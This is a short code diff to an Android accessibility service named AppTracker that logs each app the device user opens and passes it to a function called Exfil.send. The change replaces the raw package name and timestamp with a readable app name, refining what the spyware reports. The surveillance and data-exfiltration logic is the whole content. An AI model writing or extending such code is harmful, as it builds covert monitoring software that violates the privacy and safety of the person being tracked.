@@ -34,7 +34,7 @@ public class AppTracker extends AccessibilityService {
         lastPkg = pkg;
         lastSend = System.currentTimeMillis();
 
-        Exfil.send("APP_OPEN", "▶ " + pkg + "\n🕐 " + new java.util.Date());
+        Exfil.send("APP_OPEN", "▶ " + AppNames.get(pkg));
     }
 
     @Override public void onInterrupt() {}
